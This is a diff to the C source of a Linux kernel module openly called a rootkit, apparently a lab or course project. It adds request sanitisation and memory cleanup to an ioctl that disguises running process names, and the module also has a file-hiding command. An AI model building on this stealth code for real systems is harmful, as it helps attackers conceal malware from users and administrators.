@@ -40,8 +40,30 @@ static int rootkit_release(struct inode *inode, struct file *filp)
 	return 0;
 }
 
-static void sanitize_req(struct masq_proc_req *req) {
-	return;
+static int sanitize_req(struct masq_proc_req *req)
+{
+
+	struct masq_proc *buf;
+	int i;
+	int len = 0;
+
+	buf = (struct masq_proc *)kmalloc(sizeof(struct masq_proc) * req->len, GFP_KERNEL);
+	if (buf == NULL) {
+		return -EFAULT;
+	}
+
+	// remove entry with strlen(new_name) > strlen(orig_name)
+	for (i = 0; i < req->len; i++) {
+		if (strlen(req->list[i].new_name) > strlen(req->list[i].orig_name))
+			continue;
+		memcpy(&buf[len++], &req->list[i], sizeof(struct masq_proc));
+	}
+	memcpy(req->list, buf, sizeof(struct masq_proc) * len);
+	req->len = len;
+
+	kfree(buf);
+	
+	return 0;
 }
 
 static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
@@ -93,11 +115,23 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 		}
 		if (copy_from_user(req.list, user_list, list_size)) {
 			ret = -EFAULT;
-			break;
+			goto err_free;
 		}
 		
-		// XXX: remove entry with strlen(new_name) > strlen(orig_name)
-		sanitize_req(&req);
+		// remove entry with strlen(new_name) > strlen(orig_name)
+		ret = sanitize_req(&req);
+		if (ret) {
+			goto err_free;
+		}
+
+		/*
+		pr_err("after sanitization:\n");
+		for (i = 0; i < req.len; i++) {
+			pr_err("%zu:\n", i);
+			pr_err("\t%s\n", req.list[i].orig_name);
+			pr_err("\t%s\n", req.list[i].new_name);
+		}
+		*/
 
 		for_each_process(task) {
 			for (i = 0; i < req.len; i++)
@@ -109,7 +143,8 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 					task_unlock(task);
 				}
 		}
-		
+err_free:
+		kfree(req.list);
 		break;
 	}
 	case IOCTL_FILE_HIDE:
